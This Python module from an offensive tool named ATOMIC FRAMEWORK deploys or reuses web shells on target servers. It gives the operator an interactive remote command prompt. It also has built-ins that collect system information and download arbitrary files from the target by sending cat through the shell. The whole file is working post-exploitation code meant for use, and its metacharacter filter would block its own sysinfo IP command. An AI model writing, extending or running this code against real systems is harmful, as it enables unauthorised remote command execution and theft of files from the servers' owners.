#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v9.0 - ULTIMATE EDITION
OS Shell Handler

Provides an interactive command-execution interface via previously
uploaded web shells (managed by :mod:`modules.shell.manager`).  When
``--os-shell`` is passed and at least one exploitable finding exists,
the handler attempts to deploy a minimal web shell and drop into an
interactive pseudo-terminal session.
"""

from typing import Optional, Dict, List

from config import Colors


class OSShellHandler:
    """Interactive OS shell over HTTP via deployed web shells."""

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.config = engine.config
        self.verbose = self.config.get("verbose", False)
        self._shell_url: Optional[str] = None
        self._shell_param: str = "cmd"

    # ─── public API ──────────────────────────────────────────────────

    def run(self, findings: List, forms: Optional[List] = None) -> None:
        """Attempt to obtain an OS shell.

        1. Try to reuse an existing shell from the shell manager DB.
        2. If none exists, attempt to upload a fresh shell via
           :class:`~modules.uploader.ShellUploader`.
        3. Drop into an interactive loop.
        """
        print(f"\n{Colors.BOLD}{'─' * 60}{Colors.RESET}")
        print(f"{Colors.CYAN}  OS Shell Handler{Colors.RESET}")
        print(f"{Colors.BOLD}{'─' * 60}{Colors.RESET}\n")

        # 1. Try existing shells
        shell_info = self._find_existing_shell()
        if shell_info:
            self._shell_url = shell_info["url"]
            self._shell_param = shell_info.get("password", "cmd")
            print(f"{Colors.success('Reusing existing shell session')}")
        else:
            # 2. Attempt fresh upload
            self._shell_url = self._deploy_shell(findings, forms or [])

        if not self._shell_url:
            print(f"{Colors.warning('Could not obtain an OS shell')}")
            return

        # 3. Verify shell is alive
        if not self._verify_shell():
            print(f"{Colors.warning('Shell verification failed — shell may be dead')}")
            return

        # 4. Interactive session
        self._interactive_loop()

    # ─── shell acquisition ───────────────────────────────────────────

    def _find_existing_shell(self) -> Optional[Dict]:
        """Query the database for a previously uploaded shell."""
        try:
            from utils.database import Database

            db = Database()
            shells = db.get_shells()
            if shells:
                return shells[0]
        except Exception:
            pass
        return None

    def _deploy_shell(self, findings, forms) -> Optional[str]:
        """Attempt to upload a new web shell using ShellUploader."""
        try:
            from modules.uploader import ShellUploader

            uploader = ShellUploader(self.engine)
            uploader.run(findings, forms)

            # Check if any shell was registered
            shell_info = self._find_existing_shell()
            if shell_info:
                return shell_info["url"]
        except Exception as e:
            if self.verbose:
                print(f"{Colors.error(f'Shell upload failed: {e}')}")
        return None

    # ─── shell interaction ───────────────────────────────────────────

    def _verify_shell(self) -> bool:
        """Send a simple ``id`` / ``whoami`` to confirm the shell works."""
        for cmd in ("id", "whoami"):
            result = self._exec(cmd)
            if result and len(result.strip()) > 0:
                print(f"{Colors.success(f'Shell verified — {cmd}: {result.strip()[:80]}')}")
                return True
        return False

    # Characters that could allow command chaining in a shell context
    _SHELL_META = set(";|&`$(){}")

    def _exec(self, cmd: str) -> Optional[str]:
        """Execute *cmd* through the web shell and return stdout."""
        if not self._shell_url:
            return None
        # Reject commands containing shell metacharacters to prevent chaining
        if self._SHELL_META.intersection(cmd):
            return None
        try:
            from urllib.parse import quote as _url_quote

            sep = "&" if "?" in self._shell_url else "?"
            url = f"{self._shell_url}{sep}{self._shell_param}={_url_quote(cmd)}"
            resp = self.requester.request(url, "GET")
            return resp.text if resp else None
        except Exception:
            return None

    # ─── interactive loop ────────────────────────────────────────────

    def _interactive_loop(self) -> None:
        """Drop into a pseudo-shell read-eval-print loop."""
        exit_hint = 'OS Shell session started (type "exit" to quit)'
        print(f"\n{Colors.info(exit_hint)}")
        print(f"{Colors.info('Commands: help, sysinfo, download <file>, upload <file>')}\n")

        while True:
            try:
                cmd = input(f"{Colors.RED}os-shell{Colors.RESET} > ")
            except (KeyboardInterrupt, EOFError):
                print()
                break

            cmd = cmd.strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break
            if cmd.lower() == "help":
                self._print_help()
                continue
            if cmd.lower() == "sysinfo":
                self._sysinfo()
                continue
            if cmd.lower().startswith("download "):
                self._download(cmd[9:].strip())
                continue

            result = self._exec(cmd)
            if result is not None:
                print(result)
            else:
                print(f"{Colors.error('No response from shell')}")

    # ─── built-in commands ───────────────────────────────────────────

    def _sysinfo(self) -> None:
        """Collect basic system information."""
        commands = [
            ("OS", "uname -a"),
            ("User", "whoami"),
            ("Hostname", "hostname"),
            ("IP", "hostname -I 2>/dev/null || ifconfig 2>/dev/null | head -5"),
            ("Kernel", "cat /proc/version 2>/dev/null"),
        ]
        print(f"\n{Colors.BOLD}System Information{Colors.RESET}")
        for label, cmd in commands:
            result = self._exec(cmd)
            if result and result.strip():
                print(f"  {label:10s}: {result.strip()[:120]}")
        print()

    def _download(self, remote_path: str) -> None:
        """Download a remote file by catting it through the shell."""
        import os
        from config import Config

        result = self._exec(f"cat {remote_path}")
        if not result:
            print(f"{Colors.error('Could not read remote file')}")
            return
        local_name = os.path.basename(remote_path)
        local_path = os.path.join(Config.REPORTS_DIR, local_name)
        os.makedirs(Config.REPORTS_DIR, exist_ok=True)
        with open(local_path, "w") as f:
            f.write(result)
        print(f"{Colors.success(f'Saved to {local_path}')}")

    @staticmethod
    def _print_help() -> None:
        print(f"""
{Colors.BOLD}OS Shell Commands:{Colors.RESET}
  help              Show this help
  sysinfo           Collect system info (uname, user, hostname, IP)
  download <path>   Download a remote file
  exit / quit       End session

  Any other input is executed as an OS command on the remote host.
""")
